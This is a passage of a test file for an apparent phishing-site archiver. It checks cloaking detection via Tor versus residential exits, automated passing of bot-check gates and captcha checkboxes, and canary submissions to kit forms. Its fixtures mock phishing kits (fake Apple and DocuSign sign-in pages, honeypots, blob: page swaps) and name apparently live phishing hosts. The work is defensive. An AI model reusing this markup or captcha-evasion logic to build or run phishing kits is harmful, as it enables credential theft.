	expect(html).toContain('type="password"');
});

describe("cloaking", () => {
	const url = "https://lookup-lgr.to/en/verification";
	const decoyUrl = "https://www.wikipedia.org/";
	const kitUrl = "https://device.ledger-config.live/en";

	/** The submitted interstitial loads, then its script navigates to where its server sent this visitor. */
	function cloakerFixture(destination: (egress: FabricEgress) => string | undefined, options: { residentialOnline?: boolean; jumpBeforeLoad?: boolean } = {}) {
		return archiveBrowserFixture({
			pageUrl: url,
			goto: async ({ egress, replaceDocument }) => {
				if (egress === "residential" && options.residentialOnline === false) throw new Error("net::ERR_PROXY_CONNECTION_FAILED");
				const target = destination(egress);
				const submitted = responseForNavigation(url, 200, { contentType: "text/html; charset=utf-8" });
				if (!target) return submitted;
				const jumped = responseForNavigation(target, 200, { contentType: "text/html; charset=utf-8" });
				// A jump from the page's <head> beats DOMContentLoaded: the browser
				// sees the submitted document, and the navigation resolves with the destination.
				if (options.jumpBeforeLoad) {
					replaceDocument(submitted);
					return jumped;
				}
				setTimeout(() => replaceDocument(jumped), 5);
				return submitted;
			},
		});
	}
	const settle = { scriptNavigationSettleMs: 500 } as const;

	test("follows the interstitial's script navigation and records it as its own hop", async () => {
		const fixture = cloakerFixture(() => `${url}/done`);

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing"]);
		expect(archive.url).toBe(`${url}/done`);
		expect(archive.cloaking).toBeUndefined();
		expect(archive.navigationHops).toEqual([
			{ index: 0, url, hostname: "lookup-lgr.to", status: 200, redirectTo: `${url}/done`, contentType: "text/html; charset=utf-8", contentCaptured: false },
			{ index: 1, url: `${url}/done`, hostname: "lookup-lgr.to", status: 200, contentType: "text/html; charset=utf-8", contentCaptured: true },
		]);
	});

	test("a scripted jump to another site over Tor is repeated from the residential exit, which captures what a victim sees", async () => {
		const fixture = cloakerFixture((egress) => (egress === "residential" ? kitUrl : decoyUrl));

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		// The server IP is not tried: a cloaker answering Tor with a decoy is
		// already the signal, and the residential exit is the only route that helps.
		expect(fixture.leasedEgress).toEqual(["phishing", "residential"]);
		expect(fixture.closeCount).toBe(2);
		expect(archive.url).toBe(kitUrl);
		expect(archive.cloaking).toEqual({
			outcome: "detected",
			detail: `${url} sent the Tor exit to wikipedia.org but the residential exit to ledger-config.live`,
		});
		expect(archive.navigationHops.map(({ url: hopUrl, redirectTo, contentCaptured }) => ({ hopUrl, redirectTo, contentCaptured }))).toEqual([
			{ hopUrl: url, redirectTo: kitUrl, contentCaptured: false },
			{ hopUrl: kitUrl, redirectTo: undefined, contentCaptured: true },
		]);
	});

	test("the same scripted destination for every route captures it and leaves the verdict to the destination", async () => {
		const fixture = cloakerFixture(() => decoyUrl);

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		// apple-condition.com (submission 376291398434951215): its cloakit check
		// sent Tor and the residential exit alike to Wikipedia.
		expect(fixture.leasedEgress).toEqual(["phishing", "residential"]);
		expect(fixture.closeCount).toBe(2);
		expect(archive.url).toBe(decoyUrl);
		expect(archive.cloaking).toEqual({
			outcome: "uniform",
			detail: `${url} sent both the Tor exit and the residential exit to wikipedia.org by script`,
		});
	});

	test("a jump the page's <head> makes before it finishes loading is still the submitted page's scripted jump", async () => {
		// docusign.alt3-doc3ea7-v2.sbs (submission 376813288618463354) answers with
		// `location.replace` to a random news front page in its <head>, so the
		// navigation resolved with the news site and the capture looked like a
		// plain visit to it.
		const rotation: Partial<Record<FabricEgress, string>> = { phishing: "https://www.reuters.com/", residential: "https://www.bbc.com/" };
		const fixture = cloakerFixture((egress) => rotation[egress], { jumpBeforeLoad: true });

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing", "residential"]);
		expect(archive.url).toBe("https://www.bbc.com/");
		expect(archive.cloaking).toEqual({
			outcome: "detected",
			detail: `${url} sent the Tor exit to reuters.com but the residential exit to bbc.com`,
		});
		expect(archive.navigationHops).toEqual([
			{ index: 0, url, hostname: "lookup-lgr.to", status: 200, redirectTo: "https://www.bbc.com/", contentType: "text/html; charset=utf-8", contentCaptured: false },
			{ index: 1, url: "https://www.bbc.com/", hostname: "www.bbc.com", status: 200, contentType: "text/html; charset=utf-8", contentCaptured: true },
		]);
	});

	test("a jump before load to the same site for every route is uniform cloaking", async () => {
		const fixture = cloakerFixture(() => decoyUrl, { jumpBeforeLoad: true });

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing", "residential"]);
		expect(archive.url).toBe(decoyUrl);
		expect(archive.cloaking?.outcome).toBe("uniform");
		expect(archive.navigationHops.map(({ url: hopUrl, redirectTo }) => ({ hopUrl, redirectTo }))).toEqual([
			{ hopUrl: url, redirectTo: decoyUrl },
			{ hopUrl: decoyUrl, redirectTo: undefined },
		]);
	});

	test("a jump before load that stays on the submitted site is recorded as a hop and never triggers the residential exit", async () => {
		const fixture = cloakerFixture(() => `${url}/step-2`, { jumpBeforeLoad: true });

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing"]);
		expect(archive.cloaking).toBeUndefined();
		expect(archive.url).toBe(`${url}/step-2`);
		expect(archive.navigationHops.map(({ url: hopUrl, redirectTo, contentCaptured }) => ({ hopUrl, redirectTo, contentCaptured }))).toEqual([
			{ hopUrl: url, redirectTo: `${url}/step-2`, contentCaptured: false },
			{ hopUrl: `${url}/step-2`, redirectTo: undefined, contentCaptured: true },
		]);
	});

	test("a scripted jump that stays on the submitted site never triggers the residential exit or a cloaking mark", async () => {
		const fixture = cloakerFixture(() => `${url}/step-2`);

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing"]);
		expect(archive.cloaking).toBeUndefined();
	});

	test("an offline residential exit leaves the decoy capture marked as unresolved cloaking", async () => {
		const fixture = cloakerFixture(() => decoyUrl, { residentialOnline: false });

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing", "residential"]);
		expect(archive.url).toBe(decoyUrl);
		expect(archive.cloaking).toEqual({
			outcome: "unresolved",
			detail: `${url} sent the Tor exit to wikipedia.org by script; the residential exit capture failed: net::ERR_PROXY_CONNECTION_FAILED via residential exit`,
		});
	});

	test("a scripted destination that fails is unreachable, never a capture of Chromium's error page", async () => {
		// Production 2026-10-30: the residential exit followed the cloaker to the kit,
		// which redirected to a dead decoy host (HTTP 502). Chromium then showed
		// chrome-error://chromewebdata/, which was captured as if it were a site.
		const deadUrl = "http://ogenhoallin.com/";
		const fixture = archiveBrowserFixture({
			pageUrl: url,
			goto: async ({ egress, replaceDocument }) => {
				if (egress === "residential") {
					setTimeout(() => replaceDocument(Object.assign(
						responseForNavigation(deadUrl, 502, { contentType: "text/html", redirects: [{ url: "https://device.ledger-config.live/", status: 307, location: deadUrl }] }),
						{ url: () => deadUrl },
					)), 5);
					setTimeout(() => replaceDocument(responseForNavigation("chrome-error://chromewebdata/", 200, {})), 15);
				} else {
					setTimeout(() => replaceDocument(responseForNavigation(decoyUrl, 200, { contentType: "text/html" })), 5);
				}
				return responseForNavigation(url, 200, { contentType: "text/html; charset=utf-8" });
			},
		});

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing", "residential"]);
		expect(archive.url).toBe(decoyUrl);
		expect(archive.cloaking).toEqual({
			outcome: "unresolved",
			detail: `${url} sent the Tor exit to wikipedia.org by script; the residential exit capture failed: the page sent the visitor to https://device.ledger-config.live/, which ended in HTTP 502 at ${deadUrl} via residential exit`,
		});
	});

	test("a site unreachable over Tor and the server IP is tried once more from the residential exit", async () => {
		const fixture = archiveBrowserFixture({
			pageUrl: kitUrl,
			goto: async ({ egress }) => {
				if (egress !== "residential") throw new Error(`net::ERR_CONNECTION_RESET at ${kitUrl}`);
				return responseForNavigation(kitUrl, 200, { contentType: "text/html" });
			},
		});

		const archive = await archiveWebsite({ url: kitUrl }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing", "reporting", "residential"]);
		expect(archive.url).toBe(kitUrl);
		expect(archive.cloaking).toBeUndefined();
	});

	test("a short link's HTTP redirects to a cloaker do not hide the cloaker's scripted jump", async () => {
		// Production 2026-11-01 (375199039110516736): share.google 302s through
		// google.com to an s-url.sbs bot check, whose script sent the Tor exit to
		// a troll page and real visitors to an Ozon kit.
		const shortUrl = "https://share.google/xnf72t40tx4fzvKM2";
		const googleUrl = "https://www.google.com/share.google?q=xnf72t40tx4fzvKM2";
		const cloakerUrl = "https://s-url.sbs/EoZAxs";
		const trollUrl = "https://fuckyou.gay/";
		const ozonUrl = "https://xj0r2x2j-ozon.agenticive.com/price.php";
		const fixture = archiveBrowserFixture({
			pageUrl: cloakerUrl,
			goto: async ({ egress, replaceDocument }) => {
				setTimeout(() => replaceDocument(responseForNavigation(egress === "residential" ? ozonUrl : trollUrl, 200, { contentType: "text/html" })), 5);
				return responseForNavigation(cloakerUrl, 200, {
					contentType: "text/html; charset=utf-8",
					redirects: [{ url: shortUrl, status: 302, location: googleUrl }, { url: googleUrl, status: 301, location: cloakerUrl }],
				});
			},
		});

		const archive = await archiveWebsite({ url: shortUrl }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing", "residential"]);
		expect(archive.url).toBe(ozonUrl);
		expect(archive.cloaking).toEqual({
			outcome: "detected",
			detail: `${shortUrl} sent the Tor exit to fuckyou.gay but the residential exit to agenticive.com`,
		});
	});

	test("an HTTP redirect to another site is the host's declared destination and never triggers the residential exit", async () => {
		const fixture = archiveBrowserFixture({
			pageUrl: kitUrl,
			goto: async () => responseForNavigation(kitUrl, 200, { contentType: "text/html", redirects: [{ url, status: 302, location: kitUrl }] }),
		});

		const archive = await archiveWebsite({ url }, { ...settle, getBrowser: fixture.getBrowser });

		expect(fixture.leasedEgress).toEqual(["phishing"]);
		expect(archive.cloaking).toBeUndefined();
	});
});

const chromiumExecutable = process.env.PHISHING_TEST_CHROMIUM
	?? `${homedir()}/Library/Caches/ms-playwright/chromium_headless_shell-1248/chrome-headless-shell-mac-arm64/chrome-headless-shell`;
const chromiumAvailable = await Bun.file(chromiumExecutable).exists();

describe.skipIf(!chromiumAvailable)("verification gates, in a real browser", () => {
	const filler = "Family photos stay in the local archive until the next backup.";
	const hiddenFiller = `<i style="font-size:0!important;opacity:0!important;position:absolute!important">${filler}</i>`.repeat(40);
	const appleForm = `<h1>Sign in with Apple Account</h1><input id="email" placeholder="Email or Phone Number"><input id="password" type="password" placeholder="Password"><button type="submit">Sign In</button>`;

	/** Serves one kit page; `/verify` answers after a silent proof of work, like the workers.dev kit. */
	function serveKit(page: string, hits: string[]) {
		return Bun.serve({
			port: 0,
			fetch: async (request) => {
				const { pathname } = new URL(request.url);
				hits.push(pathname);
				if (pathname === "/verify") return Response.json({ ok: true });
				if (pathname === "/login-form") return new Response(appleForm, { headers: { "content-type": "text/html" } });
				return new Response(page, { headers: { "content-type": "text/html; charset=utf-8" } });
			},
		});
	}

	const launch = async () => puppeteer.launch({ executablePath: chromiumExecutable, headless: true, args: ["--no-first-run"] });

	test("clicks the kit's own 'I'm not a robot' control and captures the sign-in page it reveals", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><head><title>\u200b</title></head><body>${hiddenFiller}
<main><section id="gate"><h1>Security Check</h1>
<div role="button" tabindex="0" id="box" aria-label="I'm not a robot"><span class="check"></span><span>I'm not a robot</span><div>reCAPTCHA</div><div>Privacy - Terms</div></div>
</section><div id="content"></div></main>
<footer>Copyright © 2024 Apple Inc. All rights reserved.</footer>
<script>
document.getElementById("box").addEventListener("click", async () => {
	// A silent proof of work before the kit talks to its backend again.
	const until = Date.now() + 1500; while (Date.now() < until) await new Promise((r) => setTimeout(r, 50));
	await fetch("/verify", { method: "POST" });
	const html = await (await fetch("/login-form")).text();
	document.getElementById("gate").remove();
	document.getElementById("content").innerHTML = html;
});
</script></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 5_000, getBrowser: launch });

			expect(archive.verificationGate).toEqual({ label: "I'm not a robot" });
			const text = archive.text.toString();
			expect(text).toContain("Sign in with Apple Account");
			expect(text).toContain("Email or Phone Number");
			expect(text).not.toContain("Security Check");
			expect(text).not.toContain(filler);
			expect(hits).toEqual(["/c2222120", "/verify", "/login-form"]);
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("captures a kit that swaps its real page in from a blob: URL as the page it loaded", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><div class="spinner"></div><script>
setTimeout(async () => {
	const html = "<!DOCTYPE html><html><body>${appleForm.replaceAll('"', '\\"')}</body></html>";
	location.replace(URL.createObjectURL(new Blob([html], { type: "text/html" })));
}, 50);
</script></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 2_000, getBrowser: launch });

			expect(archive.url).toBe(url);
			expect(archive.navigationHops).toEqual([expect.objectContaining({ url, status: 200, contentCaptured: true })]);
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("captures a kit that swaps in its blob: page before the page finishes loading as the page it loaded", async () => {
		const hits: string[] = [];
		// secure.nicholasmeeker.com replaced itself synchronously, so the browser's
		// own navigation result was the blob: document rather than the site.
		const server = serveKit(`<!DOCTYPE html><html><head><script>
location.replace(URL.createObjectURL(new Blob(["<!DOCTYPE html><html><body>${appleForm.replaceAll('"', '\\"')}</body></html>"], { type: "text/html" })));
</script></head><body></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 2_000, getBrowser: launch });

			expect(archive.url).toBe(url);
			expect(archive.hostname).toBe("127.0.0.1");
			expect(archive.navigationHops).toEqual([expect.objectContaining({ url, hostname: "127.0.0.1", status: 200, contentCaptured: true })]);
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("records the page a clicked gate navigates the main frame to as its own hop", async () => {
		// docusign.alt3-doc3ea7-v2.sbs over the residential exit: a self-posting
		// interstitial, a "Confirm you are human" page, then the email form. The
		// hops ended at the interstitial's 302, which was marked as the captured page.
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><main><h1>Security Check</h1>
<div role="button" tabindex="0" id="box" aria-label="Confirm you are human"><span>Confirm you are human</span></div></main>
<script>document.getElementById("box").addEventListener("click", () => { location.href = "/login-form"; });</script></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const loginUrl = `http://127.0.0.1:${server.port}/login-form`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 3_000, getBrowser: launch });

			expect(archive.verificationGate).toEqual({ label: "Confirm you are human" });
			expect(archive.url).toBe(loginUrl);
			expect(archive.navigationHops).toEqual([
				expect.objectContaining({ index: 0, url, status: 200, redirectTo: loginUrl, contentCaptured: false }),
				expect.objectContaining({ index: 1, url: loginUrl, status: 200, contentCaptured: true }),
			]);
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(hits).toEqual(["/c2222120", "/login-form"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	describe("acting on the captured page in the same visit", () => {
		const html = (body: string, headers: Record<string, string> = {}) => new Response(`<!DOCTYPE html><html><body>${body}</body></html>`, { headers: { "content-type": "text/html; charset=utf-8", ...headers } });
		const signIn = `<h1>Enter password</h1><input type="password" name="passwd" placeholder="Password"><button>Sign in</button>`;
		const emailField = { ref: "f5", control: "input[type=email]", id: "email", name: "email", label: "Email address" };
		const value = "probe.0123456789abcdef@probe-canary.invalid";
		const fill = (field: WebsiteDataEntryField = emailField, fillValue = value) => ({ kind: "fill" as const, field, value: fillValue });
		const click = (label: string): WebsitePageAction => ({ kind: "click", control: { ref: "b1", label } });

		/** The DocuSign gate: honeypots, the email field, a captcha widget that issues its token (or never does), and an "Open" button. */
		function gatePage(tokenAfterMs: number | undefined) {
			return `<form action="/word/verify.workspace.php" method="POST" id="mainForm"><label for="email">Email address</label>
<input type="text" name="website" class="hp-field" tabindex="-1" style="position:absolute;left:-9999px">
<input type="text" name="company_url" class="hp-field" tabindex="-1" style="position:absolute;left:-9999px">
<input type="email" id="email" name="email" placeholder="you@example.com">
<div class="cf-turnstile"><input type="hidden" name="cf-turnstile-response" value=""></div>
<button type="submit" id="submitBtn">Open</button></form>
${tokenAfterMs === undefined ? "" : `<script>setTimeout(() => { document.querySelector("[name=cf-turnstile-response]").value = "0.token"; }, ${tokenAfterMs});</script>`}`;
		}

		/**
		 * The DocuSign kit's "One more step" interstitial (submission
		 * 376813288618463354): ids and classes change on every visit, an
		 * off-screen honeypot, and a "Confirm" button. Its click sets the kit's
		 * session cookie; the email page only shows to a visitor holding it, and
		 * the sign-in page only to one who also posted an address.
		 */
		const interstitial = (suffix: string) => `<div class="spb7e6hqb${suffix}">Protected session</div><h1 class="tz2gz97e2${suffix}">One more step</h1>
<p>One click verifies your session and lets you continue.</p>
<button type="button" class="xknzu4dhlw96${suffix}" id="fsjrdbmpp03a${suffix}"><span class="b3h956noz9e"></span><span id="muol5dp2apeh${suffix}">Confirm</span></button>
<input type="text" name="website" value="" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0">
<script>document.querySelector("button").addEventListener("click", () => { document.cookie = "kit_session=${suffix}; path=/"; location.href = "/word/verify.workspace.php"; });</script>`;

		function serveKit(options: { tokenAfterMs?: number } = { tokenAfterMs: 0 }) {
			const posts: Array<Record<string, string>> = [];
			let visit = 0;
			const server = Bun.serve({
				port: 0,
				fetch: async (request) => {
					const { pathname } = new URL(request.url);
					const cookie = request.headers.get("cookie") ?? "";
					const session = cookie.match(/kit_session=(\w+)/)?.[1];
					if (request.method === "POST") {
						posts.push(Object.fromEntries(new URLSearchParams(await request.text())));
						return new Response(null, { status: 302, headers: { location: "/word/signin.php", "set-cookie": "kit_email=1; path=/" } });
					}
					if (pathname === "/word/signin.php") return html(session && cookie.includes("kit_email=1") ? signIn : interstitial(String(++visit)));
					return html(session ? gatePage(options.tokenAfterMs) : interstitial(String(++visit)));
				},
			});
			return { server, posts, url: `http://127.0.0.1:${server.port}/word/verify.workspace.php` };
		}

		/** Captures the page keeping its browser open, takes the actions in that visit, then releases it. */
		async function visit(url: string, actions: WebsitePageAction[]) {
			const leased: FabricEgress[] = [];
			const browsers: Browser[] = [];
			const first = await archiveWebsite({ url, keepSession: true }, {
				...fast,
				renderSettleMs: 1_500,
				humanCheckMs: 3_000,
				pageActionQuietMs: 2_000,
				getBrowser: async (egress?: FabricEgress) => {
					leased.push(egress!);
					const browser = await launch();
					browsers.push(browser);
					return browser;
				},
			});
			const pages: WebsiteArchiveResult[] = [];
			try {
				for (const action of actions) pages.push(await first.session!.act(action));
			} finally {
				await first.session?.close();
			}
			return { leased, first, pages, last: pages.at(-1) ?? first, connected: browsers.map((browser) => browser.connected) };
		}

		test("the email page of a kit that binds it to its session is reached by clicking through in the same visit", async () => {
			const kit = serveKit();
			try {
				const { leased, first, pages, last, connected } = await visit(kit.url, [click("Confirm"), fill()]);

				// One browser, one route, kept for the whole flow and released at the end.
				expect(leased).toEqual(["phishing"]);
				expect(connected).toEqual([false]);
				expect(first.session).toBeDefined();
				expect(first.text.toString()).toContain("One more step");

				expect(pages[0]!.performedAction).toEqual(click("Confirm"));
				expect(pages[0]!.url).toBe(kit.url);
				expect(pages[0]!.navigationHops).toEqual([expect.objectContaining({ index: 0, url: kit.url, status: 200, contentCaptured: true })]);
				expect(pages[0]!.text.toString()).toContain("Email address");

				// The honeypots stay empty, and the captcha's token went along.
				expect(kit.posts).toEqual([{ website: "", company_url: "", email: value, "cf-turnstile-response": "0.token" }]);
				expect(last.performedAction).toEqual({ ...fill(), humanCheck: "passed" });
				expect(last.url).toBe(kit.url.replace("verify.workspace.php", "signin.php"));
				// The hops start at the submission: the POST's redirect, then the page it opened.
				expect(last.navigationHops).toEqual([
					expect.objectContaining({ index: 0, url: kit.url, status: 302, redirectTo: last.url, contentCaptured: false }),
					expect.objectContaining({ index: 1, url: last.url, status: 200, contentCaptured: true }),
				]);
				expect(last.text.toString()).toContain("Enter password");
				expect(last.route).toBe("Tor exit");
				expect(last.screenshotPng?.byteLength).toBeGreaterThan(0);
			} finally {
				kit.server.stop(true);
			}
		}, 60_000);

		test("a kit's own progress text is waited out until the page it opens", async () => {
			// docusign.alt3-doc3ea7-v2.sbs: "Confirm" turns into "Checking…" before the
			// email page loads, and the email submission shows "Success! Opening...
			// Connecting" before the sign-in page.
			const server = Bun.serve({
				port: 0,
				fetch: async (request) => {
					const { pathname } = new URL(request.url);
					if (pathname === "/signin") return html(signIn);
					if (pathname === "/email") return html(`<form id="f"><input type="email" id="email" name="email"><button>Open</button></form><div id="status"></div>
<script>document.getElementById("f").addEventListener("submit", (event) => {
	event.preventDefault();
	document.getElementById("status").textContent = "Success! Opening...";
	setTimeout(() => { document.getElementById("status").textContent = "Success! Opening... Connecting"; }, 1500);
	setTimeout(() => { location.href = "/signin"; }, 4000);
});</script>`);
					return html(`<h1>Hold on a second</h1><button id="c">Confirm</button>
<script>document.getElementById("c").addEventListener("click", () => {
	document.getElementById("c").textContent = "Checking…";
	setTimeout(() => { location.href = "/email"; }, 3000);
});</script>`);
				},
			});
			try {
				const { pages } = await visit(`http://127.0.0.1:${server.port}/`, [click("Confirm"), fill()]);
				expect(pages.map((page) => new URL(page.url).pathname)).toEqual(["/email", "/signin"]);
				expect(pages[1]!.text.toString()).toContain("Enter password");
				expect(pages[1]!.navigationHops).toEqual([expect.objectContaining({ index: 0, status: 200, contentCaptured: true })]);
			} finally {
				server.stop(true);
			}
		}, 90_000);

		test("a page that only changes its text, and keeps it, is captured once the text settles", async () => {
			const server = Bun.serve({
				port: 0,
				fetch: () => html(`<form id="f"><input type="email" id="email" name="email"><button>Next</button></form><p id="error"></p>
<script>document.getElementById("f").addEventListener("submit", (event) => { event.preventDefault(); document.getElementById("error").textContent = "This address is not allowed."; });</script>`),
			});
			try {
				const started = Date.now();
				const { last } = await visit(`http://127.0.0.1:${server.port}/`, [fill()]);
				expect(last.text.toString()).toContain("This address is not allowed.");
				// Settled after the quiet period, well before the overall bound.
				expect(Date.now() - started).toBeLessThan(20_000);
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("a new visit without the kit's session never sees its email page", async () => {
			// Why the flow keeps one visit: a second, fresh visit is shown the gate again.
			const kit = serveKit();
			try {
				const clicked = await visit(kit.url, [click("Confirm")]);
				expect(clicked.last.text.toString()).toContain("Email address");
				const fresh = await archiveWebsite({ url: kit.url }, { ...fast, renderSettleMs: 1_500, getBrowser: launch });
				expect(fresh.text.toString()).toContain("One more step");
				expect(fresh.session).toBeUndefined();
			} finally {
				kit.server.stop(true);
			}
		}, 60_000);

		test("submits anyway when the captcha never passes, and records that it did not", async () => {
			const kit = serveKit({ tokenAfterMs: undefined });
			try {
				const { last } = await visit(kit.url, [click("Confirm"), fill()]);
				expect(kit.posts).toEqual([{ website: "", company_url: "", email: value, "cf-turnstile-response": "" }]);
				expect(last.performedAction).toMatchObject({ humanCheck: "unsolved" });
			} finally {
				kit.server.stop(true);
			}
		}, 90_000);

		/**
		 * A stand-in for a provider's widget, drawn like Turnstile: its frame sits
		 * in a closed shadow root beside the field, and the checkbox about 30 px
		 * in. `mode` says how it behaves: it passes by itself, passes once its
		 * checkbox is clicked, or turns into an image challenge on the click.
		 */
		function serveWidgetKit(mode: "invisible" | "click" | "image") {
			const posts: Array<Record<string, string>> = [];
			let checkboxClicks = 0;
			const server = Bun.serve({
				port: 0,
				fetch: async (request) => {
					const { pathname } = new URL(request.url);
					if (pathname === "/captcha/clicked") { checkboxClicks++; return new Response("ok"); }
					if (pathname === "/captcha/widget") return html(`<div style="margin:0;height:65px;position:relative">
<label id="box" style="position:absolute;left:16px;top:20px;width:24px;height:24px;border:2px solid #666;display:block"></label><span style="position:absolute;left:52px;top:22px">Verify you are human</span></div>
<script>${mode === "invisible" ? `setTimeout(() => parent.postMessage("token", "*"), 300);` : ""}
document.getElementById("box").addEventListener("click", () => { fetch("/captcha/clicked"); ${mode === "click" ? `parent.postMessage("token", "*");` : `document.body.innerHTML = "<p>Select all images with a bus</p>";`} });</script>`);
					if (request.method === "POST") {
						posts.push(Object.fromEntries(new URLSearchParams(await request.text())));
						return html(signIn);
					}
					return html(`<form method="POST" action="/next"><input type="email" id="email" name="email">
<div class="cf-turnstile" id="widget" style="width:300px;height:65px"></div><input type="hidden" name="cf-turnstile-response" value=""><button>Open</button></form>
<script>
const root = document.getElementById("widget").attachShadow({ mode: "closed" });
root.innerHTML = '<iframe src="/captcha/widget" style="width:300px;height:65px;border:0"></iframe>';
addEventListener("message", (event) => { if (event.data === "token") document.querySelector("[name=cf-turnstile-response]").value = "0.widget-token"; });
</script>`);
				},
			});
			return { server, posts, clicks: () => checkboxClicks, url: `http://127.0.0.1:${server.port}/` };
		}

		const widgetVisit = (url: string, port: number) => archiveWebsite({ url, keepSession: true }, {
			...fast,
			renderSettleMs: 1_500,
			humanCheckMs: 6_000,
			pageActionQuietMs: 1_000,
			captchaProviderFrame: new RegExp(`^http://127\\.0\\.0\\.1:${port}/captcha/widget`),
			getBrowser: launch,
		}).then(async (first) => {
			try {
				return await first.session!.act(fill());
			} finally {
				await first.session!.close();
			}
		});

		test("a captcha that passes by itself is never clicked", async () => {
			const kit = serveWidgetKit("invisible");
			try {
				const page = await widgetVisit(kit.url, kit.server.port!);
				expect(page.performedAction).toMatchObject({ humanCheck: "passed" });
				expect(kit.clicks()).toBe(0);
				expect(kit.posts).toEqual([{ email: value, "cf-turnstile-response": "0.widget-token" }]);
			} finally {
				kit.server.stop(true);
			}
		}, 60_000);

		test("a captcha that asks for its checkbox gets one click inside its closed shadow root, then the form is sent with its token", async () => {
			const kit = serveWidgetKit("click");
			try {
				const page = await widgetVisit(kit.url, kit.server.port!);
				expect(kit.clicks()).toBe(1);
				expect(page.performedAction).toMatchObject({ humanCheck: "passed_after_click" });
				expect(kit.posts).toEqual([{ email: value, "cf-turnstile-response": "0.widget-token" }]);
				expect(page.text.toString()).toContain("Enter password");
			} finally {
				kit.server.stop(true);
			}
		}, 60_000);

		test("an image challenge after the click is never attempted: one click, then the form is sent without a token", async () => {
			const kit = serveWidgetKit("image");
			try {
				const page = await widgetVisit(kit.url, kit.server.port!);
				expect(kit.clicks()).toBe(1);
				expect(page.performedAction).toMatchObject({ humanCheck: "unsolved_after_click" });
				expect(kit.posts).toEqual([{ email: value, "cf-turnstile-response": "" }]);
			} finally {
				kit.server.stop(true);
			}
		}, 60_000);

		test("a kit that draws its field without a form and swaps in its next step is captured as the same page", async () => {
			const server = Bun.serve({
				port: 0,
				fetch: () => html(`<div id="step"><input id="login" name="loginfmt" type="text" placeholder="Email, phone, or Skype"><div role="button" id="next">Next</div></div>
<script>document.getElementById("next").addEventListener("click", () => {
	const who = document.getElementById("login").value;
	document.getElementById("step").innerHTML = "<div>" + who + "</div>" + ${JSON.stringify(signIn)};
});</script>`),
			});
			try {
				const url = `http://127.0.0.1:${server.port}/common/oauth2`;
				const field = { ref: "f1", control: "input[type=text]", id: "login", name: "loginfmt", placeholder: "Email, phone, or Skype" };
				const { last } = await visit(url, [fill(field)]);

				expect(last.performedAction).toEqual(fill(field));
				expect(last.navigationHops).toEqual([expect.objectContaining({ index: 0, url, status: 200, contentCaptured: true })]);
				expect(last.navigationHops[0]!.redirectTo).toBeUndefined();
				expect(last.text.toString()).toContain(value);
				expect(last.text.toString()).toContain("Enter password");
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("a form without a button is sent with Enter, and a field the page draws late is waited for", async () => {
			const posts: Array<Record<string, string>> = [];
			const server = Bun.serve({
				port: 0,
				fetch: async (request) => {
					if (request.method === "POST") {
						posts.push(Object.fromEntries(new URLSearchParams(await request.text())));
						return html(signIn);
					}
					return html(`<div id="slot"></div><script>setTimeout(() => {
	document.getElementById("slot").innerHTML = '<form method="POST" action="/next"><input type="email" name="email"></form>';
}, 1500);</script>`);
				},
			});
			try {
				const { last } = await visit(`http://127.0.0.1:${server.port}/`, [fill({ ref: "f1", control: "input[type=email]", name: "email" })]);
				expect(posts).toEqual([{ email: value }]);
				expect(last.url).toBe(`http://127.0.0.1:${server.port}/next`);
				expect(last.text.toString()).toContain("Enter password");
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("a second identifier step is taken on the page the first one opened", async () => {
			const posts: Array<{ path: string; body: Record<string, string> }> = [];
			const server = Bun.serve({
				port: 0,
				fetch: async (request) => {
					const { pathname } = new URL(request.url);
					if (request.method === "POST") {
						posts.push({ path: pathname, body: Object.fromEntries(new URLSearchParams(await request.text())) });
						return new Response(null, { status: 303, headers: { location: pathname === "/email" ? "/phone" : "/signin" } });
					}
